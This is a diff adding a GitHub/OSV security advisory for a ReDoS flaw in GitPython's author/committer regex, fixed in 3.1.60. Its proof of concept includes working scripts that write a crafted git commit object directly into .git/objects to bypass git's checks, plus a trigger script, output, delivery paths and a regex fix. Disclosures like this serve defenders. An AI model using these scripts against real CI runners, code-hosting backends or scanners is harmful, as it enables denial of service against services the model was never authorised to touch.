@@ -1,0 +1,181 @@
+{
+  "id": "GHSA-g5vv-9gxw-82hx",
+  "modified": "2026-09-30T23:45:04.037560336Z",
+  "published": "2026-09-30T23:29:14Z",
+  "aliases": [
+    "CVE-2026-87819",
+    "PYSEC-2026-3984"
+  ],
+  "summary": "GitPython: Denial of Service via catastrophic backtracking (ReDoS) in Actor.name_email_regex — commit author/committer field parsing",
+  "details": "### Summary\n\nGitPython's `Actor.name_email_regex` regular expression (`git/util.py`, line 863)\nis vulnerable to catastrophic backtracking (ReDoS — Regular Expression Denial of\nService). When GitPython parses the `author` or `committer` header of a git commit\nobject that contains a long string with an unterminated `\u003c` (no matching `\u003e`), the\nPython regex engine enters quadratic backtracking, causing complete single-threaded\nCPU exhaustion proportional to the square of the input length.\n\nA single crafted commit object can block any GitPython API call that reads\n`.author` or `.committer` for **over two minutes per invocation**, enabling denial\nof service against CI runners, code-hosting backends, repository-scanning\npipelines, or any service that processes commits from third-party or untrusted\nrepositories.\n\n---\n\n### Details\n\n**Vulnerable file and line:**\n\n`git/util.py`, line 863:\n\n```python\nname_email_regex = re.compile(r\"(.*) \u003c(.*?)\u003e\")\n```\n\nThis regex is evaluated inside `Actor._from_string()` (line 909) every time\nGitPython resolves a commit's `.author` or `.committer` property.\n\n**Full call chain — from public API to vulnerable sink:**\n\n\n\n\ncommit.author # any ordinary GitPython API call\n└── git/objects/commit.py:917\nCommit._deserialize()\n└── git/objects/util.py:341\nparse_actor_and_date(author_line)\n└── git/util.py:909\nActor._from_string(string)\n└── Actor.name_email_regex.search(string) ← VULNERABLE\n\n\n\n\n`author_line` is decoded directly from the raw bytes of the git commit object with\n**no length limit, character restriction, or timeout** applied at any point before\nreaching the regex engine. The same chain is triggered by:\n- `commit.author`\n- `commit.committer`\n- `repo.iter_commits()`\n- `repo.blame()`\n- Any web service / CI tool that displays or processes commit metadata\n\n**Why this pattern backtracks catastrophically:**\n\nThe pattern `(.*) \u003c(.*?)\u003e` contains an unbounded greedy group `(.*)` followed by\na literal space and `\u003c`. When the input is a long string that contains `\u003c` but no\nclosing `\u003e`, the regex engine must try every possible split position for the greedy\ngroup — O(n²) candidate positions for a string of length n — each of which then\ndrives the inner lazy group into further sub-match attempts. This is the\nwell-documented \"catastrophic backtracking\" failure mode for this family of\npatterns.\n\n**Empirically measured scaling (tested against GitPython 3.1.59, commit 52a6cba):**\n\n| Author field length (bytes) | Time to resolve `.author` |\n|-----------------------------|--------------------------|\n| 1,000  | 0.0035 s |\n| 5,000  | 0.084 s  |\n| 10,000 | 0.341 s  |\n| 20,000 | 1.525 s  |\n| 40,000 | 5.963 s  |\n| 60,000 | 13.360 s |\n| 80,000 | 23.871 s |\n| **200,000** | **150.488 s** |\n\nEach doubling of input size roughly quadruples processing time (e.g. 40,000 →\n80,000 bytes: 5.96 s → 23.87 s ≈ 4.0×), confirming O(n²) growth. Git itself\nimposes **no practical size limit** on author name fields in the object format.\n\n**How the malicious object reaches a victim:**\n\nThe PoC creates the commit object as a correctly SHA-1-hashed, zlib-compressed git\nloose object written directly into `.git/objects/`. `git cat-file -t \u003csha\u003e` confirms\nit is a valid `commit` type and git's own read-side tools display it without error.\nOnly git's write-side tooling (`git commit --author`, `git update-index`,\nexplicit `git fsck`) applies the sanity checks that would reject a malformed author\nline. Delivery paths that bypass those checks include:\n\n- A git server with `receive.fsckObjects = false` (common in self-hosted deployments)\n- A `.git` directory shipped as a tarball, backup, or zip archive\n- A git bundle file\n- Any automated mirror or import tool that operates at the object level\n\n---\n\n### PoC\n\n**Environment used for testing:**\n- GitPython 3.1.59, installed in editable mode from source (no code modifications)\n- Python 3.12.3, git 2.43.0, Ubuntu 24.04\n\n**Script 1 — craft the malicious repository (`craft_malicious_repo.py`):**\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nCreates a git repository with one commit whose 'author' field is a large\nstring containing an unterminated '\u003c'. Bypasses git's write-side sanity\nchecks by writing the raw object directly into .git/objects/.\n\nUsage: python3 craft_malicious_repo.py \u003ctarget_dir\u003e \u003cpayload_size_bytes\u003e\n\"\"\"\nimport hashlib, os, subprocess, sys, zlib\n\ndef run(cmd, cwd):\n    return subprocess.run(cmd, cwd=cwd, check=True, capture_output=True, text=True)\n\ndef main():\n    if len(sys.argv) != 3:\n        print(f\"usage: {sys.argv[0]} \u003ctarget_dir\u003e \u003cpayload_size_bytes\u003e\")\n        sys.exit(1)\n\n    target_dir, payload_size = sys.argv[1], int(sys.argv[2])\n\n    os.makedirs(target_dir, exist_ok=True)\n    run([\"git\", \"init\", \"--quiet\"], cwd=target_dir)\n    run([\"git\", \"config\", \"user.email\", \"poc@example.com\"], cwd=target_dir)\n    run([\"git\", \"config\", \"user.name\", \"PoC\"], cwd=target_dir)\n\n    with open(os.path.join(target_dir, \"README.txt\"), \"w\") as f:\n        f.write(\"GitPython ReDoS PoC repository\\n\")\n    run([\"git\", \"add\", \"README.txt\"], cwd=target_dir)\n    tree_sha = run([\"git\", \"write-tree\"], cwd=target_dir).stdout.strip()\n\n    malicious_name = \"A\" * payload_size\n    # Key: author field contains a '\u003c' with no closing '\u003e'\n    author_line    = f\"author {malicious_name} \u003cunterminated 1691999972 -0700\"\n    committer_line = \"committer PoC \u003cpoc@example.com\u003e 1691999972 -0700\"\n    message        = \"ReDoS PoC commit\"\n\n    commit_content = (\n        f\"tree {tree_sha}\\n{author_line}\\n{committer_line}\\n\\n{message}\\n\"\n    ).encode()\n\n    header     = f\"commit {len(commit_content)}\\x00\".encode()\n    store      = header + commit_content\n    sha        = hashlib.sha1(store).hexdigest()\n    compressed = zlib.compress(store)\n\n    objdir = os.path.join(target_dir, \".git\", \"objects\", sha[:2])\n    os.makedirs(objdir, exist_ok=True)\n    with open(os.path.join(objdir, sha[2:]), \"wb\") as f:\n        f.write(compressed)\n\n    run([\"git\", \"update-ref\", \"refs/heads/master\", sha], cwd=target_dir)\n\n    print(f\"Malicious commit sha : {sha}\")\n    print(f\"Payload size         : {payload_size} bytes\")\n    verify = subprocess.run(\n        [\"git\", \"cat-file\", \"-t\", sha],\n        cwd=target_dir, capture_output=True, text=True\n    )\n    print(f\"git cat-file -t confirms: {verify.stdout.strip()}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\n**Script 2 — trigger the vulnerability (`trigger_redos.py`):**\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nOpens the repository with GitPython and times commit.author access,\nwhich triggers Actor._from_string() -\u003e Actor.name_email_regex.search().\n\nUsage: python3 trigger_redos.py \u003crepo_dir\u003e \u003ccommit_sha\u003e\n\"\"\"\nimport sys, time, git\n\ndef main():\n    if len(sys.argv) != 3:\n        print(f\"usage: {sys.argv[0]} \u003crepo_dir\u003e \u003ccommit_sha\u003e\")\n        sys.exit(1)\n\n    repo   = git.Repo(sys.argv[1])\n    commit = repo.commit(sys.argv[2])\n\n    print(\"Accessing commit.author — triggers Actor._from_string()...\")\n    t0     = time.time()\n    author = commit.author          # ← this single line causes the hang\n    elapsed = time.time() - t0\n\n    print(f\"Author name length : {len(author.name)} chars\")\n    print(f\"Elapsed            : {elapsed:.3f} seconds\")\n    print(\"RESULT: VULNERABLE\" if elapsed \u003e 5 else \"RESULT: not triggered\")\n\nif __name__ == \"__main__\":\n    main()\n```\n**Execution and observed output:**\n\n\n\n\n$ python3 craft_malicious_repo.py /tmp/victim-repo 200000\nMalicious commit sha : 2450fbd5ab5ebfff430dab183d25678df9fd20de\nPayload size : 200000 bytes\ngit cat-file -t confirms: commit\n\n$ python3 trigger_redos.py /tmp/victim-repo 2450fbd5ab5ebfff430dab183d25678df9fd20de\nAccessing commit.author — triggers Actor._from_string()...\nAuthor name length : 200014 chars\nElapsed : 150.488 seconds\nRESULT: VULNERABLE\n\n\n\n**Docker reproduction (fully isolated environment):**\n\n```bash\ndocker run --rm -it -v ~/gitpython-poc:/work -w /work python:3.8-bookworm bash\n\n# Inside the container:\napt-get update \u0026\u0026 apt-get install -y git\ngit clone --depth 1 https://github.com/gitpython-developers/GitPython.git /work/GitPython\npip install -e /work/GitPython\n\npython3 /work/poc/craft_malicious_repo.py /work/victim-repo 200000\n# note the SHA printed, then:\npython3 /work/poc/trigger_redos.py /work/victim-repo \u003cSHA\u003e\n```\n\nThe `python:3.8-bookworm` base image matches the one used in GitPython's own\n`fuzzing/local-dev-helpers/Dockerfile`.\n\n---\n\n### Impact\n\n**Who is affected:**\n\nAny application that uses GitPython to parse commits from a source it does not\nfully control. High-risk deployments include:\n\n- **CI/CD systems** (Jenkins, GitLab CI, GitHub Actions self-hosted runners, etc.)\n  that clone and inspect third-party pull requests — one malicious commit in a PR\n  can stall every worker that processes it.\n- **Code-hosting or code-review web services** that render commit author information\n  — a single crafted push blocks every page render or API response that touches that\n  commit's metadata.\n- **Security or compliance scanners** that walk repository history across many\n  repositories — one crafted object in any repository exhausts a scanner worker.\n\n**Severity of impact:**\n\nA 200 KB author field blocks a process for ~150 seconds per single `.author`\naccess. When `iter_commits()` or `blame` are used, every commit in a history\ntraversal can be independently crafted, multiplying the total hang time by the\nnumber of commits processed. There is no confidentiality or integrity impact —\nthis is a pure availability / resource-exhaustion vulnerability.\n\n---\n\n### Suggested Fix\n\nReplace the vulnerable pattern with one that cannot backtrack catastrophically.\nThe minimal, behavior-preserving fix is to exclude `\u003c` and `\u003e` from the name\ngroup, removing the ambiguity that forces O(n²) backtracking:\n\n```python\n# git/util.py, line 863\n# Before (vulnerable):\nname_email_regex = re.compile(r\"(.*) \u003c(.*?)\u003e\")\n\n# After (fixed — identical output for all well-formed input):\nname_email_regex = re.compile(r\"([^\u003c\u003e]*) \u003c([^\u003c\u003e]*)\u003e\")\n```\n\nBecause the name group can no longer itself contain a `\u003c` character, the engine\nhas exactly one candidate position to try when a closing `\u003e` is absent — and fails\nin O(n) time instead of O(n²). Legitimate actor strings (`Name \u003cemail\u003e`) never\ncontain `\u003c` or `\u003e` in either field, so this change produces identical results for\nall valid input.\n\nAs defense in depth, independently of the regex fix, bounding the maximum number\nof characters GitPython will attempt to parse in an author/committer line (e.g.\nrejecting strings longer than 4096 bytes before passing them to any regex) would\nfurther limit the blast radius of any future ReDoS class in this parser.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "gitpython",
+        "purl": "pkg:pypi/gitpython"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.1.60"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.7",
+        "0.2.0-beta1",
+        "0.3.0-beta1",
+        "0.3.0-beta2",
+        "0.3.1-beta2",
+        "0.3.2",
+        "0.3.2.1",
+        "0.3.2.RC1",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.3.6",
+        "0.3.7",
+        "1.0.0",
+        "1.0.1",
+        "1.0.2",
+        "2.0.0",
+        "2.0.1",
+        "2.0.2",
+        "2.0.3",
+        "2.0.4",
+        "2.0.5",
+        "2.0.6",
+        "2.0.7",
+        "2.0.8",
+        "2.0.9",
+        "2.0.9.dev0",
+        "2.0.9.dev1",
+        "2.1.0",
+        "2.1.1",
+        "2.1.10",
+        "2.1.11",
+        "2.1.12",
+        "2.1.13",
+        "2.1.14",
+        "2.1.15",
+        "2.1.2",
+        "2.1.3",
+        "2.1.4",
+        "2.1.5",
+        "2.1.6",
+        "2.1.7",
+        "2.1.8",
+        "2.1.9",
+        "3.0.0",
+        "3.0.1",
+        "3.0.2",
+        "3.0.3",
+        "3.0.4",
+        "3.0.5",
+        "3.0.6",
+        "3.0.7",
+        "3.0.8",
+        "3.0.9",
+        "3.1.0",
+        "3.1.1",
+        "3.1.10",
+        "3.1.11",
+        "3.1.12",
+        "3.1.13",
+        "3.1.14",
+        "3.1.15",
+        "3.1.16",
+        "3.1.17",
+        "3.1.18",
+        "3.1.19",
+        "3.1.2",
+        "3.1.20",
+        "3.1.22",
+        "3.1.23",
+        "3.1.24",
+        "3.1.25",
+        "3.1.26",
+        "3.1.27",
+        "3.1.28",
+        "3.1.29",
+        "3.1.3",
+        "3.1.30",
+        "3.1.31",
+        "3.1.32",
+        "3.1.33",
+        "3.1.34",
+        "3.1.35",
+        "3.1.36",
+        "3.1.37",
+        "3.1.38",
+        "3.1.4",
+        "3.1.40",
+        "3.1.41",
+        "3.1.42",
+        "3.1.43",
+        "3.1.44",
+        "3.1.45",
+        "3.1.46",
+        "3.1.47",
+        "3.1.48",
+        "3.1.49",
+        "3.1.5",
+        "3.1.50",
+        "3.1.51",
+        "3.1.52",
+        "3.1.53",
+        "3.1.54",
+        "3.1.55",
+        "3.1.56",
+        "3.1.57",
+        "3.1.58",
+        "3.1.59",
+        "3.1.6",
+        "3.1.7",
+        "3.1.8",
+        "3.1.9"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.1.59",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-g5vv-9gxw-82hx/GHSA-g5vv-9gxw-82hx.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-g5vv-9gxw-82hx"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/pull/2215"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/commit/751473a5f3221d6f989291cbebcc404353fd3ba8"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gitpython-developers/GitPython"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.60"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2026-3984.yaml"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.vulncheck.com/advisories/gitpython-before-3.1.60-denial-of-service-via-redos"
+    }
+  ]
+}
